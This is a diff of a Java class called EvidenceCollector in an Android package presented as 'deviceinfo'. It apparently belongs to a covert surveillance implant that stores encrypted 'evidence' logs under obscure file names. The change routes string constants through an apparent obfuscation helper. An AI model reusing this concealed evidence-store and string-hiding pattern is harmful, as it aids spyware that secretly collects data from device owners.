@@ -20,7 +20,6 @@ import java.util.Vector;
 
 import android.content.Context;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.crypto.Encryption;
@@ -29,6 +28,7 @@ import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -38,13 +38,13 @@ public class EvidenceCollector {
 	/** The debug. */
 	private static final String TAG = "EvidenceColl"; //$NON-NLS-1$
 	/** The Constant LOG_EXTENSION. */
-	public static final String LOG_EXTENSION = Messages.getString("22_0"); //$NON-NLS-1$
+	public static final String LOG_EXTENSION = M.e(".mob"); //$NON-NLS-1$
 
 	/** The Constant LOG_DIR_PREFIX. */
-	public static final String LOG_DIR_PREFIX = Messages.getString("22_1"); // Utilizzato per creare le //$NON-NLS-1$
+	public static final String LOG_DIR_PREFIX = M.e("Z"); // Utilizzato per creare le //$NON-NLS-1$
 	// Log Dir
 	/** The Constant LOG_DIR_FORMAT. */
-	public static final String LOG_DIR_FORMAT = Messages.getString("22_2"); // Utilizzato nella //$NON-NLS-1$
+	public static final String LOG_DIR_FORMAT = M.e("Z*"); // Utilizzato nella //$NON-NLS-1$
 	// ricerca delle Log Dir
 	/** The Constant LOG_PER_DIRECTORY. */
 	public static final int LOG_PER_DIRECTORY = 500; // Numero massimo di log
@@ -53,8 +53,8 @@ public class EvidenceCollector {
 	public static final int MAX_LOG_NUM = 25000; // Numero massimo di log che
 
 	/** The Constant PROG_FILENAME. */
-	private static final String PROG_FILENAME = Messages.getString("22_3"); //$NON-NLS-1$
-	public static final String LOG_TMP = Messages.getString("22_4"); //$NON-NLS-1$
+	private static final String PROG_FILENAME = M.e("geb"); //$NON-NLS-1$
+	public static final String LOG_TMP = M.e(".dat"); //$NON-NLS-1$
 
 	/** The seed. */
 	int seed;
@@ -162,7 +162,7 @@ public class EvidenceCollector {
 			fos.close();
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
+				Check.log(TAG + " Warn: " + e.toString());//$NON-NLS-1$
 			}
 		}
 
@@ -234,10 +234,10 @@ public class EvidenceCollector {
 
 		final String basePath = Path.logs();
 
-		final String blockDir = Messages.getString("22_5") + (progressive / LOG_PER_DIRECTORY); //$NON-NLS-1$
+		final String blockDir = M.e("l_") + (progressive / LOG_PER_DIRECTORY); //$NON-NLS-1$
 
 		// http://www.rgagnon.com/javadetails/java-0021.html
-		final String mask = Messages.getString("22_6"); //$NON-NLS-1$
+		final String mask = M.e("0000"); //$NON-NLS-1$
 		final String ds = Long.toString(progressive % 10000); // double to
 		// string
 		final int size = mask.length() - ds.length();
